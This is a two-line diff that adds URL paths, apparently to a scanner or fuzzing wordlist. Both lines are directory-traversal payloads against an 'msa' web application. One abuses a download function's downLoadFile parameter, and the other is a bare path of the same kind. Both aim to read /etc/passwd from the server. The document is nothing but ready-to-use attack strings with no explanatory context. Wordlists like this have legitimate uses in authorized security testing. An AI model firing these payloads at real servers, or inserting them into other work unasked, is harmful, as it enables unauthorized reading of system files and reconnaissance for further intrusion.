@@ -1,0 +1,2 @@
+/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd
+/msa/../../../../../../../../etc/passwd
